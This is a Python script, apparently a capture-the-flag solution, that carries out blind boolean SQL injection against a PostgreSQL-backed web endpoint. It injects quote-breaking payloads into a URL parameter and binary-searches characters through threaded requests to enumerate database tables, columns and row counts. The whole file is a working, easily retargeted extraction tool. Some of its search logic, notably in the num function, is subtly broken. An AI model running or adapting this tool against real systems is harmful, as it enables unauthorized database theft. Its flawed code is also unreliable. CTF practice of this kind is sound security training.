#!/usr/bin/env python
"""Planetary Probe: blind PostgreSQL extraction through a one-lamp oracle.

Constraints measured on the target:
  * the payload is injected into a SQL string literal and the app **lower-cases it**, so
    uppercase can only be produced with chr(); every comparison here is numeric
    (ascii/length), which survives that rewrite;
  * the response is exactly one bit: readout--carrier vs readout--null;
  * the app answers 12 concurrent requests in ~1 s, so a character (7 dependent probes)
    costs ~7 s of wall time only if the positions are read in parallel.

Two thread pools: OUTER reads several values at once, INNER reads the characters of one
value at once. Keeping them separate avoids the deadlock you get when tasks submitted to a
saturated pool wait on tasks in the same pool.
"""
import json
import ssl
import sys
import threading
import time
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor

BASE = "https://planetary.web.2026.sunshinectf.games/probe?planet="
CTX = ssl.create_default_context()
INNER = ThreadPoolExecutor(max_workers=16)
OUTER = ThreadPoolExecutor(max_workers=4)
CALL = [0]
ERR = [0]
_lock = threading.Lock()


def _get(payload):
    url = BASE + urllib.parse.quote(payload, safe="")
    with _lock:
        CALL[0] += 1
    req = urllib.request.Request(url, headers={"User-Agent": "probe"})
    with urllib.request.urlopen(req, timeout=40, context=CTX) as r:
        return r.read()


def ask(payload):
    for attempt in range(8):
        try:
            body = _get(payload)
        except Exception as e:
            with _lock:
                ERR[0] += 1
            time.sleep(0.4 + attempt * 0.6)
            continue
        if b"readout--carrier" in body:
            return True
        if b"readout--null" in body:
            return False
        time.sleep(0.5)
    raise RuntimeError("no answer: %r" % payload)


def cond(expr):
    """Is <expr> true? anchored on MARS so a false MARS can never masquerade as a false expr."""
    return ask("MARS' AND (%s)-- " % expr)


def read_len(expr, maxlen=600):
    if not cond("length(%s)>32" % expr):
        hi = 32                       # names and flags are short; skip the wide search
    elif cond("length(%s)>=%d" % (expr, maxlen)):
        raise RuntimeError("%s is longer than %d" % (expr, maxlen))
    else:
        hi = maxlen - 1
    lo = 0 if hi == maxlen - 1 else 0
    while lo < hi:
        mid = (lo + hi) // 2
        lo = mid + 1 if cond("length(%s)>%d" % (expr, mid)) else mid
    return lo


def read_char(expr, pos):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        lo = mid + 1 if cond("ascii(substr((%s),%d,1))>%d" % (expr, pos, mid)) else mid
    return lo


def read_str(expr, maxlen=600, label=""):
    try:
        n = read_len(expr, maxlen)
    except Exception as e:
        print("[!] %s: %s" % (label or expr, e))
        return None
    if n == 0:
        return ""
    codes = list(INNER.map(lambda p: read_char(expr, p), range(1, n + 1)))
    s = "".join(chr(c) for c in codes)
    print("[=] %-22s %r  (%d calls, %d err)" % (label or expr, s, CALL[0], ERR[0]))
    return s


def read_many(items, maxlen=600):
    """items = [(label, expr)] -> {label: value}, values read in parallel."""
    return list(OUTER.map(lambda it: read_str(it[1], maxlen, it[0]), items))


def num(expr, hi=1 << 20):
    lo = 0
    if not cond("(%s)>8" % expr):
        hi = 8
    while lo < hi:
        mid = (lo + hi + 1) // 2
        lo = mid if cond("(%s)>=%d" % (expr, mid)) else hi - 1
    return lo


TABLES = "(SELECT table_name FROM information_schema.tables WHERE table_schema='public' ORDER BY table_name LIMIT 1 OFFSET %d)"
COLUMNS = "(SELECT column_name FROM information_schema.columns WHERE table_schema='public' AND table_name='%s' ORDER BY ordinal_position LIMIT 1 OFFSET %d)"


def controls():
    print("[*] controls")
    for e, want in [("1=1", True), ("1=2", False),
                    ("ascii('A')=65", "payload not lowercased"),
                    ("ascii('A')=97", "payload IS lowercased"),
                    ("ascii(chr(65))=65", True),
                    ("'a'='A'", "collation is case-insensitive"),
                    ("(SELECT count(*) FROM planets)>0", True)]:
        got = cond(e)
        print("    %-32s -> %s   (%s)" % (e, got, want))
    print("[*] planets rows:", num("(SELECT count(*) FROM planets)"))


def schema():
    n = num("(SELECT count(*) FROM information_schema.tables WHERE table_schema='public')")
    print("[*] public tables:", n)
    names = [x for x in read_many([("table%d" % i, TABLES % i) for i in range(n)]) if x]
    info = {}
    cols_items = []
    for t in names:
        k = num("(SELECT count(*) FROM information_schema.columns WHERE table_schema='public' AND table_name='%s')" % t)
        cols_items += [("%s.%d" % (t, j), COLUMNS % (t, j)) for j in range(k)]
        info[t] = {"ncols": k, "rows": num('(SELECT count(*) FROM "%s")' % t)}
    got = dict()
    for (label, expr), val in zip(cols_items, read_many(cols_items)):
        got.setdefault(label.rsplit(".", 1)[0], []).append(val)
    for t in names:
        info[t]["columns"] = got.get(t, [])
        print("[+] %-18s rows=%-5d %s" % (t, info[t]["rows"], info[t]["columns"]))
    json.dump(info, open("analysis/schema.json", "w"), indent=1)
    return info


if __name__ == "__main__":
    controls()
    schema()
    print("[*] %d probes, %d errors" % (CALL[0], ERR[0]))
